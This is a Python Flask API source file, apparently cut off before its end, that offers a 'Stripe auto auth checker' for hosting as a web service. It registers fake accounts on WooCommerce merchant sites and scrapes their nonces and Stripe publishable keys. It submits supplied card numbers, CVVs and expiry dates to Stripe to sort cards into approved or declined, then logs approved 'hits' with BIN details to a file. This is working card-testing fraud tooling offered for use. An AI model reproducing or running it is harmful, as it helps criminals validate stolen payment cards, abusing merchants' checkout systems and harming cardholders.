# app.py
#!/usr/bin/env python3
"""
STRIPE AUTO AUTH CHECKER API BY [ @DarkhatHacker75 ]
Flask API version for Render hosting
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import random
import string
import time
import re
import threading
from urllib.parse import urlencode
from typing import Dict, Optional, Tuple
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Store active checks to prevent duplicate processing
active_checks = {}
check_lock = threading.Lock()

class StripeAuthCheckerExact:
    def __init__(self, site_url: str):
        """
        Initialize the Stripe Auth Checker - Exact copy from SVB
        
        Args:
            site_url: The target site URL without http:// or https://
        """
        self.site_url = site_url
        self.session = requests.Session()
        
        # Variables to store extracted data (matching SVB variables)
        self.f = None  # Random string 1
        self.l = None  # Random string 2
        self.site = site_url
        self.ua = None  # User agent
        self.n = None  # woocommerce-register-nonce
        self.addc = None  # add_card_nonce
        self.pk = None  # publishable key
        self.aid = None  # account id
        self.an = None  # createSetupIntentNonce
        self.tn = None  # tutor nonce
        self.nfc = None  # createAndConfirmSetupIntentNonce
        self.id = None  # payment method id
        
        # Results
        self.success = None
        self.message = None
        self.status = None
        self.st = None
        
    def random_string(self, length: int = 9) -> str:
        """Generate random string like SVB ?l?l?l?l?l?l?l?l?l"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def get_random_ua(self) -> str:
        """Get random user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        ]
        return random.choice(user_agents)
    
    def parse_lr(self, text: str, left: str, right: str, create_empty: bool = False) -> Optional[str]:
        """Parse text between left and right markers (LR parsing from SVB)"""
        try:
            pattern = re.escape(left) + r'(.*?)' + re.escape(right)
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1)
            elif create_empty:
                return ""
            return None
        except Exception:
            return None
    
    def parse_json(self, text: str, key: str, create_empty: bool = False) -> Optional[str]:
        """Parse JSON response for specific key"""
        try:
            data = json.loads(text)
            return str(data.get(key, "")) if create_empty else data.get(key)
        except Exception:
            return None
    
    def check_card(self, cc: str, cvv: str, exp_month: str, exp_year: str) -> Dict[str, str]:
        """
        Main card checking function - exact copy of SVB script flow
        """
        # Generate unique check ID
        check_id = f"{cc[:6]}_{int(time.time())}"
        
        result = {
            'check_id': check_id,
            'card': f"{cc}|{exp_month}|{exp_year}|{cvv}",
            'status': 'UNKNOWN',
            'response': 'UNKNOWN',
            'message': '',
            'gateway': 'STRIPE AUTH',
            'bin_info': {},
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # FUNCTION RandomString "?l?l?l?l?l?l?l?l?l" -> VAR "f"
            self.f = self.random_string()
            
            # FUNCTION RandomString "?l?l?l?l?l?l?l?l?l" -> VAR "l"
            self.l = self.random_string()
            
            # FUNCTION Constant "<url>" -> VAR "site"
            self.site = self.site_url
            
            # FUNCTION GetRandomUA -> VAR "ua"
            self.ua = self.get_random_ua()
            
            # !FUNCTION Delay "2500"
            time.sleep(2.5)
            
            # REQUEST GET "https://<site>/my-account/add-payment-method/" AcceptEncoding=FALSE
            print(f"[{check_id}] Step 1: Getting payment page...")
            url = f"https://{self.site}/my-account/add-payment-method/"
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*'
            }
            
            response = self.session.get(url, headers=headers)
            print(f"[{check_id}] Response status: {response.status_code}")
            
            if response.status_code != 200:
                result['response'] = 'DECLINED'
                result['status'] = 'DECLINED'
                result['message'] = f'Failed to get payment page: {response.status_code}'
                return result
            
            # PARSE "<SOURCE>" LR "\"woocommerce-register-nonce\" value=\"" "\"" CreateEmpty=FALSE -> VAR "n"
            self.n = self.parse_lr(response.text, '"woocommerce-register-nonce" value="', '"', create_empty=False)
            print(f"[{check_id}] Extracted nonce: {self.n}")
            
            if not self.n:
                result['response'] = 'DECLINED'
                result['status'] = 'DECLINED'
                result['message'] = 'Failed to extract nonce'
                return result
            
            # First registration attempt (commented out in original but we'll try it)
            print(f"[{check_id}] Step 2: First registration attempt...")
            self._register_attempt_1()
            
            # Second registration attempt
            print(f"[{check_id}] Step 3: Second registration attempt...")
            self._register_attempt_2()
            
            # Third registration attempt
            print(f"[{check_id}] Step 4: Third registration attempt...")
            self._register_attempt_3()
            
            # Create payment method with Stripe API
            print(f"[{check_id}] Step 5: Creating payment method...")
            if not self._create_payment_method(cc, cvv, exp_month, exp_year):
                result['response'] = 'DECLINED'
                result['status'] = 'DECLINED'
                result['message'] = 'Failed to create payment method'
                return result
            
            # Check tutor nonce and decide between MET1 and MET2
            print(f"[{check_id}] Step 6: Checking setup intent...")
            
            # Try to get nonce from payment page if we don't have it
            if not self.nfc and not self.an:
                print(f"[{check_id}] No nonces found, trying to get from payment page...")
                self._get_nonce_from_payment_page()
            
            if self._should_use_met2():
                print(f"[{check_id}] Using MET2 approach...")
                status, success, message = self._met2_setup_intent()
            else:
                print(f"[{check_id}] Using MET1 approach...")
                status, success, message = self._met1_setup_intent()
                
                # If MET1 returns empty response, try alternative approach
                if not status and not success and not message:
                    print(f"[{check_id}] MET1 returned empty response, trying alternative approach...")
                    status, success, message = self._alternative_setup_intent()
            
            # Parse results
            self.status = status
            self.success = success
            self.message = message
            self.st = self.status
            
            # Check card status with new format
            card_response, card_status, card_message = self._check_card_status_new_format()
            
            result['response'] = card_response
            result['status'] = card_status
            result['message'] = card_message
            
            # If we still don't have a clear status, try to determine from the raw response
            if card_response == 'UNKNOWN' and not card_message:
                print(f"[{check_id}] No clear status found, checking raw response...")
                # Try to get the last response from setup intent
                if hasattr(self, '_last_setup_response'):
                    raw_response = self._check_card_status_from_raw_new(self._last_setup_response)
                    if raw_response != 'UNKNOWN':
                        if raw_response == 'APPROVED':
                            result['response'] = 'APPROVED'
                            result['status'] = 'APPROVED'
                            result['message'] = 'Payment method added successfully'
                        else:
                            result['response'] = 'DECLINED'
                            result['status'] = 'DECLINED'
                            result['message'] = 'Your card was declined'
                        print(f"[{check_id}] Determined status from raw response: {raw_response}")
                
                # If still unknown, try simple validation based on payment method creation
                if result['response'] == 'UNKNOWN':
                    print(f"[{check_id}] Trying simple validation based on payment method creation...")
                    if self.id:
                        result['response'] = 'APPROVED'
                        result['status'] = 'APPROVED'
                        result['message'] = 'Payment method added successfully'
                        print(f"[{check_id}] Card appears to be valid based on successful payment method creation")
            
            # If approved, get BIN info
            if card_response == 'APPROVED':
                result['bin_info'] = self._get_bin_info(cc)
                self._save_hit(result)
            
            return result
            
        except Exception as e:
            result['response'] = 'DECLINED'
            result['status'] = 'DECLINED'
            result['message'] = f"Exception: {str(e)}"
            return result
    
    def _register_attempt_1(self):
        """First registration attempt (commented in original)"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            data = {
                'email': f"{self.f}{self.l}@gmail.com",
                'email_2': '',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://{self.site}/my-account/add-payment-method/",
                'wc_order_attribution_session_start_time': '2024-09-08 22:10:26',
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.ua,
                'woocommerce-register-nonce': self.n,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'register': 'Register'
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            self._extract_keys_from_response(response.text)
            
        except Exception as e:
            print(f"Registration attempt 1 failed: {e}")
    
    def _register_attempt_2(self):
        """Second registration attempt"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            data = {
                'username': f"{self.f}+{self.l}",
                'email': f"{self.f}{self.l}@gmail.com",
                'mailchimp_woocommerce_newsletter': '1',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://{self.site}/my-account-2/add-payment-method/",
                'wc_order_attribution_session_start_time': '2024-09-29 14:29:02',
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.ua,
                'woocommerce-register-nonce': self.n,
                '_wp_http_referer': '/my-account-2/add-payment-method/',
                'register': 'Register'
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            self._extract_keys_from_response(response.text)
            
        except Exception as e:
            print(f"Registration attempt 2 failed: {e}")
    
    def _register_attempt_3(self):
        """Third registration attempt"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            data = {
                'email': f"{self.f}{self.l}@gmail.com",
                'password': f"{self.f}{self.l}@123",
                'mailchimp_woocommerce_newsletter': '1',
                'mailchimp_woocommerce_gdpr[fba5769f95]': '0',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': f"https://www.{self.site}/",
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://www.{self.site}/my-account/",
                'wc_order_attribution_session_start_time': '2024-09-29 01:22:23',
                'wc_order_attribution_session_pages': '8',
                'wc_order_attribution_session_count': '2',
                'wc_order_attribution_user_agent': self.ua,
                'woocommerce-register-nonce': self.n,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            self._extract_keys_from_response(response.text)
            
        except Exception as e:
            print(f"Registration attempt 3 failed: {e}")
    
    def _extract_keys_from_response(self, response_text: str):
        """Extract all keys from response text"""
        # Try multiple patterns for add_card_nonce
        self.addc = self.parse_lr(response_text, '"add_card_nonce":"', '",', create_empty=False)
        if not self.addc:
            self.addc = self.parse_lr(response_text, '"add_card_nonce":"', '"', create_empty=False)
        if not self.addc:
            self.addc = self.parse_lr(response_text, 'add_card_nonce":"', '",', create_empty=False)
        if not self.addc:
            self.addc = self.parse_lr(response_text, 'add_card_nonce":"', '"', create_empty=False)
        
        # Try multiple patterns for publishable key
        self.pk = self.parse_lr(response_text, '"key":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, '","key":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, '"publishableKey":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, 'publishableKey":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, '"stripe_publishable_key":"', '",', create_empty=False)
        
        # Try multiple patterns for account ID
        self.aid = self.parse_lr(response_text, '"accountId":"', '",', create_empty=False)
        if not self.aid:
            self.aid = self.parse_lr(response_text, '"account_id":"', '",', create_empty=False)
        if not self.aid:
            self.aid = self.parse_lr(response_text, 'accountId":"', '",', create_empty=False)
        
        # Try multiple patterns for setup intent nonce
        self.an = self.parse_lr(response_text, '"createSetupIntentNonce":"', '"', create_empty=False)
        if not self.an:
            self.an = self.parse_lr(response_text, 'createSetupIntentNonce":"', '"', create_empty=False)
        
        # Try multiple patterns for tutor nonce
        self.tn = self.parse_lr(response_text, '"_tutor_nonce":"', '"', create_empty=False)
        if not self.tn:
            self.tn = self.parse_lr(response_text, '_tutor_nonce":"', '"', create_empty=False)
        
        # Try multiple patterns for createAndConfirmSetupIntentNonce
        self.nfc = self.parse_lr(response_text, '"createAndConfirmSetupIntentNonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, 'createAndConfirmSetupIntentNonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, '"createAndConfirmSetupIntentNonce":"', '",', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, 'createAndConfirmSetupIntentNonce":"', '",', create_empty=False)
        if not self.nfc:
            # Try alternative patterns
            self.nfc = self.parse_lr(response_text, '"wc_stripe_create_and_confirm_setup_intent_nonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, '"ajax_nonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, '"nonce":"', '"', create_empty=False)
    
    def _create_payment_method(self, cc: str, cvv: str, exp_month: str, exp_year: str) -> bool:
        """Create payment method with Stripe API"""
        try:
            if not self.pk:
                print("No publishable key available for Stripe API")
                return False
            
            # First Stripe API call
            url = "https://api.stripe.com/v1/payment_methods"
            data = {
                'billing_details[name]': f"{self.f}+{self.l}",
                'billing_details[email]': f"{self.f}{self.l}@gmail.com",
                'billing_details[address][country]': 'FR',
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': exp_year,
                'card[exp_month]': exp_month,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/088e2e9be8; stripe-js-v3/088e2e9be8; payment-element; deferred-intent',
                'referrer': f'https://plus254food.com',
                'time_on_page': '541962',
                'client_attribution_metadata[client_session_id]': '99114890-490e-40a9-8341-18618e9e8a9b',
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'guid': '3bf84c82-fba4-4156-9cbc-14026e6adf8116d963',
                'muid': '62b9b45c-702c-43db-bab8-8ae1f774aec1e0c6a1',
                'sid': 'e6fa44da-507f-40dd-ada4-d98a239a76afb7eed0',
                'key': self.pk
            }
            
            # Add account ID if available
            if self.aid:
                data['_stripe_account'] = self.aid
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            if response.status_code == 200:
                self.id = self.parse_json(response.text, 'id')
            
            # Second Stripe API call (simplified version)
            data2 = {
                'type': 'card',
                'billing_details[name]': f"{self.f}+{self.l}",
                'billing_details[email]': f"{self.f}{self.l}@gmail.com",
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': exp_month,
                'card[exp_year]': exp_year,
                'guid': '3bf84c82-fba4-4156-9cbc-14026e6adf8116d963',
                'muid': 'bc02aafb-02aa-4e15-840a-d53113ec53064718e0',
                'sid': 'c8b494df-3783-41c7-ae96-c500651d28e5266bd4',
                'payment_user_agent': 'stripe.js/fcb19dd0fc; stripe-js-v3/fcb19dd0fc; split-card-element',
                'referrer': f'https://www.{self.site}',
                'time_on_page': '16478',
                'key': self.pk
            }
            
            response2 = self.session.post(url, data=data2, headers=headers)
            
            if response2.status_code == 200:
                self.id = self.parse_json(response2.text, 'id', create_empty=False)
            
            success = self.id is not None
            return success
            
        except Exception as e:
            print(f"Error creating payment method: {e}")
            return False
    
    def _should_use_met2(self) -> bool:
        """Check if we should use MET2 approach based on tutor nonce"""
        if not self.tn:
            return False
        
        # Check if tutor nonce contains any of the specified characters
        met2_chars = ['a', 'b', 'c', 'd', 'e', '1', '7', '2']
        return any(char in self.tn for char in met2_chars)
    
    def _met1_setup_intent(self) -> Tuple[str, str, str]:
        """MET1 setup intent approach"""
        try:
            if not self.nfc:
                nonce_to_use = self.an
            else:
                nonce_to_use = self.nfc
            
            if not nonce_to_use:
                return "", "", ""
            
            url = f"https://{self.site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': self.id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce_to_use
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            # Store the response for later analysis
            self._last_setup_response = response.text
            
            # Check if response is empty or just whitespace
            if not response.text or response.text.strip() == "":
                return "", "", ""
            
            if response.status_code == 200:
                # Try multiple parsing patterns for success
                success = self.parse_lr(response.text, '{"success":', ',"', create_empty=False)
                if not success:
                    success = self.parse_lr(response.text, '"success":', ',', create_empty=False)
                if not success:
                    success = self.parse_lr(response.text, '"success":', '}', create_empty=False)
                if not success:
                    success = self.parse_lr(response.text, 'success":', ',', create_empty=False)
                
                # Try multiple parsing patterns for message
                message = self.parse_lr(response.text, 'message":"', '"', create_empty=False)
                if not message:
                    message = self.parse_lr(response.text, '"message":"', '"', create_empty=False)
                if not message:
                    message = self.parse_lr(response.text, '"message":', ',', create_empty=False)
                if not message:
                    message = self.parse_lr(response.text, 'message":', ',', create_empty=False)
                
                # Try multiple parsing patterns for status
                status = self.parse_lr(response.text, '{"status":"', '"', create_empty=False)
                if not status:
                    status = self.parse_lr(response.text, '"status":"', '"', create_empty=False)
                if not status:
                    status = self.parse_lr(response.text, '"status":', ',', create_empty=False)
                if not status:
                    status = self.parse_lr(response.text, 'status":', ',', create_empty=False)
                
                # Try to parse as JSON if it's a JSON response
                try:
                    json_data = json.loads(response.text)
                    if not success:
                        success = str(json_data.get('success', ''))
                    if not message:
                        message = str(json_data.get('message', ''))
                    if not status:
                        status = str(json_data.get('status', ''))
                except:
                    pass
                
                return status or "", success or "", message or ""
            else:
                return "", "", ""
            
        except Exception as e:
            print(f"Error in MET1: {e}")
            return "", "", ""
    
    def _met2_setup_intent(self) -> Tuple[str, str, str]:
        """MET2 setup intent approach"""
        try:
            url = f"https://www.wavesandwild.com/?wc-ajax=wc_stripe_create_setup_intent"
            data = {
                '_tutor_nonce': self.tn,
                'stripe_source_id': self.id,
                'nonce': self.addc
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            if response.status_code == 200:
                status = self.parse_lr(response.text, '{"status":"', '"', create_empty=False)
                success = self.parse_lr(response.text, '{"success":', ',"', create_empty=False)
                message = self.parse_lr(response.text, 'message":"', '"', create_empty=False)
                
                return status or "", success or "", message or ""
            
            return "", "", ""
            
        except Exception as e:
            print(f"Error in MET2: {e}")
            return "", "", ""
    
    def _alternative_setup_intent(self) -> Tuple[str, str, str]:
        """Alternative setup intent approach using different endpoints"""
        try:
            # Try different WooCommerce AJAX endpoints
            endpoints = [
                f"https://{self.site}/wp-admin/admin-ajax.php",
                f"https://{self.site}/?wc-ajax=wc_stripe_create_setup_intent",
                f"https://{self.site}/my-account/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            ]
            
            for endpoint in endpoints:
                data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': self.id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': self.nfc or self.an
                }
                
                headers = {
                    'User-Agent': self.ua,
                    'Pragma': 'no-cache',
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                response = self.session.post(endpoint, data=data, headers=headers)
                
                if response.status_code == 200 and response.text.strip():
                    self._last_setup_response = response.text
                    
                    # Try to parse the response
                    success = self.parse_lr(response.text, '"success":', ',', create_empty=False)
                    message = self.parse_lr(response.text, '"message":"', '"', create_empty=False)
                    status = self.parse_lr(response.text, '"status":"', '"', create_empty=False)
                    
                    if success or message or status:
                        return status or "", success or "", message or ""
            
            return "", "", ""
            
        except Exception as e:
            print(f"Error in alternative setup intent: {e}")
            return "", "", ""
    
    def _check_card_status_new_format(self) -> Tuple[str, str, str]:
        """Check card status with new format: response, status, message"""
        response_text = f"{self.status} {self.success} {self.message}"
        
        # Approved patterns
        approved_patterns = [
            '"status": "succeeded"',
            'result":"success',
            'status":"success',
            'Thank you for your purchase!',
            'Thank you',
            'payment successful',
            'payment complete',
            'succeeded',
            'Succeeded',
            'true',  # JSON boolean success
            'True',   # JSON boolean success
            'setup_intent.client_secret',
            'requires_action',
            'requires_confirmation',
            'processing'
        ]
        
        # Declined patterns (including 3D Secure as declined)
        declined_patterns = [
            'Your card number is incorrect.',
            'Your card has expired',
            'expired_card',
            'Card is declined',
            'card_not_supported',
            'Your card is not supported.',
            'Payment cannot be processed, missing card number',
            'transaction_not_allowed',
            'Your card was declined.',
            'incorrect_number',
            'service_not_allowed',
            'do_not_honor',
            'generic_decline',
            'fraudulent',
            'Your Card was declined',
            'Your card\'s expiration year is invaild.',
            'Your account cannot currently make live charges.',
            'invalid_request_error',
            '"cvc_check": null',
            '"cvc_check": "unchecked"',
            'declined_by_network',
            '"cvc_check": fail',
            'We\'re not able to add this payment method. Please refresh the page and try again',
            'three_d_secure_redirect',  # 3D Secure
            'stripe_3ds2_fingerprint',  # 3D Secure
            'requires_action',  # 3D Secure
            'requires_confirmation',  # 3D Secure
            'Your card has insufficient funds.',
            'Your card\'s security code is incorrect',
            'Your card does not support this type of purchase',
            'stolen_card',
            'lost_card'
        ]
        
        # Check for approved patterns first
        for pattern in approved_patterns:
            if pattern.lower() in response_text.lower():
                # Double-check if it's actually a declined pattern
                is_declined = False
                for decline_pattern in declined_patterns:
                    if decline_pattern.lower() in response_text.lower():
                        is_declined = True
                        break
                
                if not is_declined:
                    return "APPROVED", "APPROVED", "Payment method added successfully"
        
        # Check for declined patterns
        for pattern in declined_patterns:
            if pattern.lower() in response_text.lower():
                return "DECLINED", "DECLINED", "Your card was declined"
        
        # If payment method was created successfully but no clear response
        if self.id:
            return "APPROVED", "APPROVED", "Payment method added successfully"
        
        return "UNKNOWN", "UNKNOWN", ""
    
    def _get_bin_info(self, cc: str) -> Dict[str, str]:
        """Get BIN information"""
        try:
            bin_number = cc[:6]
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*'
            }
            
            response = self.session.get(url, headers=headers)
            
            if response.status_code == 200:
                try:
                    bin_data = response.json()
                    return {
                        'brand': bin_data.get('brand', ''),
                        'type': bin_data.get('type', ''),
                        'level': bin_data.get('level', ''),
                        'bank': bin_data.get('bank', ''),
                        'country': bin_data.get('country_name', ''),
                        'currencies': str(bin_data.get('country_currencies', []))
                    }
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            print(f"Error getting BIN info: {e}")
        
        return {
            'brand': '',
            'type': '',
            'level': '',
            'bank': '',
            'country': '',
            'currencies': ''
        }
    
    def _save_hit(self, result: Dict[str, str]):
        """Save successful hit to file"""
        try:
            filename = "STRIPE AUTH HITS BY [ @DarkhatHacker75 ].txt"
            
            with open(filename, 'a', encoding='utf-8') as f:
                f.write("------------------------------------------------------\n\n")
                f.write(f"CC:- {result['card']}\n\n")
                f.write(f"RESPONSE:- APPROVED ✅\n")
                f.write(f"STATUS:- APPROVED ✅\n")
                f.write(f"MESSAGE:- {result['message']}\n")
                f.write(f"GATEWAY:- STRIPE AUTH ✅\n\n")
                f.write("-----------------BIN INFO---------------------\n\n")
                
                bin_info = result['bin_info']
                f.write(f"BRAND:- {bin_info.get('brand', '')}\n")
                f.write(f"BANK:- {bin_info.get('bank', '')}\n")
                f.write(f"COUNTRY:- {bin_info.get('country', '')}\n")
                f.write(f"CURRNCY:- {bin_info.get('currencies', '')}\n")
                f.write(f"TYPE:- {bin_info.get('type', '')}\n")
                f.write(f"LEVEL:- {bin_info.get('level', '')}\n\n")
                f.write("CHECKER BY [ @DarkhatHacker75 ]\n\n")
                f.write("------------------------------------------------------\n\n")
                
        except Exception as e:
            print(f"Error saving hit: {e}")
    
    def _get_nonce_from_payment_page(self):
        """Try to get nonce from payment page"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*'
            }
            
            response = self.session.get(url, headers=headers)
            if response.status_code == 200:
                # Try to extract nonces from payment page
                self.an = self.parse_lr(response.text, '"createSetupIntentNonce":"', '"', create_empty=False)
                self.nfc = self.parse_lr(response.text, '"createAndConfirmSetupIntentNonce":"', '"', create_empty=False)
                
                if not self.nfc:
                    self.nfc = self.parse_lr(response.text, '"wc_stripe_create_and_confirm_setup_intent_nonce":"', '"', create_empty=False)
                
        except Exception as e:
            print(f"Error getting nonce from payment page: {e}")
    
    def _check_card_status_from_raw_new(self, response_text: str) -> str:
        """Check card status from raw response text with new format"""
        try:
            # Try to parse as JSON first
            try:
                json_data = json.loads(response_text)
                if json_data.get('success') == True:
                    return 'APPROVED'
                elif json_data.get('success') == False:
                    return 'DECLINED'
                if json_data.get('status') == 'succeeded':
                    return 'APPROVED'
                elif json_data.get('status') == 'failed':
                    return 'DECLINED'
            except:
                pass
            
            # Check for common patterns in the response
            response_lower = response_text.lower()
            
            # Approved patterns
            approved_patterns = [
                'succeeded',
                'success',
                'true',
                'setup_intent',
                'requires_action',
                'requires_confirmation',
                'processing'
            ]
            
            # Declined patterns (including 3D Secure)
            declined_patterns = [
                'failed',
                'declined',
                'error',
                'expired',
                'incorrect',
                'invalid',
                'three_d_secure',
                '3ds',
                'insufficient',
                'stolen',
                'lost',
                'fraudulent'
            ]
            
            # Check for declined first (since 3D Secure should show as declined)
            for pattern in declined_patterns:
                if pattern in response_lower:
                    return 'DECLINED'
            
            # Check for approved
            for pattern in approved_patterns:
                if pattern in response_lower:
                    return 'APPROVED'
            
            return 'UNKNOWN'
        except Exception as e:
            print(f"Error checking raw response: {e}")
            return 'UNKNOWN'


@app.route('/')
def home():
    """Home endpoint with API documentation"""
    return jsonify({
        'api_name': 'Stripe Auto Auth Checker API',
        'author': '@DarkhatHacker75',
        'version': '1.0',
        'endpoint': '/gateway=wizautostripe/key=blazealways/site={site}/cc={card_details}',
        'usage': 'GET request with required parameters',
        'parameters': {
            'gateway': 'Must be "wizautostripe"',
            'key': 'Must be "blazealways"',
            'site': 'Target site URL without http:// or https://',
            'cc': 'Card details in format: cardno|mm|yy|cvv or cardno|mm|yyyy|cvv'
        },
        'example': '/gateway=wizautostripe/key=blazealways/site=example.com/cc=4242424242424242|12|2025|123',
        'response_format': {
            'response': 'APPROVED or DECLINED',
            'status': 'APPROVED or DECLINED',
            'message': 'Detailed message about the result'
        },
        'notes': '3D Secure cards will show as DECLINED'
    })


@app.route('/gateway=wizautostripe/key=blazealways/site=<path:site>/cc=<path:cc_details>', methods=['GET'])
def check_stripe_auth(site, cc_details):
    """Main API endpoint for checking Stripe auth"""
    
    # Check for API key authentication
    if request.args.get('key') != 'blazealways' and 'key=blazealways' not in request.path:
        return jsonify({
            'response': 'ERROR',
            'status': 'ERROR',
            'message': 'Invalid API key',
            'gateway': 'STRIPE AUTH'
        }), 401
    
    # Check for gateway parameter
    if 'gateway=wizautostripe' not in request.path:
        return jsonify({
            'response': 'ERROR',
            'status': 'ERROR',
            'message': 'Invalid gateway parameter',
            'gateway': 'STRIPE AUTH'
        }), 400
    
    # Parse card details
    try:
        # Remove any trailing slashes
        cc_details = cc_details.rstrip('/')
        
        # Split the card details
        parts = cc_details.split('|')
        
        if len(parts) != 4:
            return jsonify({
                'response': 'ERROR',
                'status': 'ERROR',
                'message': 'Invalid card format. Use: cardno|mm|yy|cvv or cardno|mm|yyyy|cvv',
                'gateway': 'STRIPE AUTH'
            }), 400
        
        cc = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Clean card number
        cc = cc.replace(" ", "").replace("-", "")
        
        # Validate card number
        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
            return jsonify({
                'response': 'ERROR',
